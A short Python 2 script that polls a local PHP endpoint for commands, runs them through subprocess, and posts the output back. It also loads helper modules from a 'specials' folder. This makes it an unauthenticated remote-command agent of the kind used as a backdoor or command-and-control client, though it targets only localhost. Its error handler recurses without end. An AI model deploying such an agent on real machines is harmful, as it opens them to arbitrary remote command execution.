# Copyright (C) 2012 aminehmida@gmail.com

#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; either version 2
#of the License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import subprocess
import re
import imp
import urllib,urllib2

#foo = getattr(sys.modules["reader"], "foo")
#foo()

class main:
    def __init__(self):
        self.command = ""
        #TODO: check for root, already running, config, ...
         
    def execute(self):
        while True:
            # read command from reader library
            self.__writeOut__("[test]", False)
            self.command = self.__readCmd__()
            
            # check if you should exit
            if self.command.strip().lower() == 'exit':
                break            
            
            #check if it is a built-in command
            if self.command[0] == '!':
                self.command = self.command[1:]
                try:
                    #TODO: take the first str after space
                    specMod = imp.load_source(self.command.split(".")[0],"./specials/%s.py" % self.command.split(".")[0])
                    specCmd = getattr(specMod, self.command.split(".")[1]) 
                    self.__writeOut__(specCmd(self))
                except Exception as e:
                    self.__writeOut__('[!] Error execution local function: %s' % e)
                
                continue
        
            # try to run command
            try:
                cmd = subprocess.Popen(re.split(r'\s+', self.command), stdout=subprocess.PIPE)
                cmd_out = cmd.stdout.read()
        
                # Process output
                self.__writeOut__(cmd_out)
        
            except OSError:
                self.__writeOut__('[!] Invalid command')
    
    def __readCmd__(self):
#        try:
#            s = raw_input()
#            return s
#        except Exception as e:
#            self.__writeOut__('[!] Error reading command: %s' % e) 
        
        url ='http://localhost/util.php'
        
        try:
            params = urllib.urlencode({'action': 'read', 'buf': 'cmd'})
            req = urllib2.Request(url, params)
            response = urllib2.urlopen(req)
            data=response.read()
            return data
        except Exception as e:
#            #TODO: if 3 errors reading command reset server
            self.__writeOut__('[!] Error reading command: %s' % e)

    def __writeOut__(self, msgStr, newLine=True):
#        if newLine:
#            print(MsgStr)
#        else:
#            print MsgStr,
        url ='http://localhost/util.php'
        
        try:
            params = urllib.urlencode({'action': 'write', 'buf': 'out', 'data': msgStr})
            req = urllib2.Request(url, params)
            response = urllib2.urlopen(req)
            data=response.read()
            return data
        except Exception as e:
            #TODO: can't write looooool make it differently ...
            self.__writeOut__('[!] Error reading command: %s' % e)        
                
if __name__ == '__main__':
    instance = main()
    instance.execute()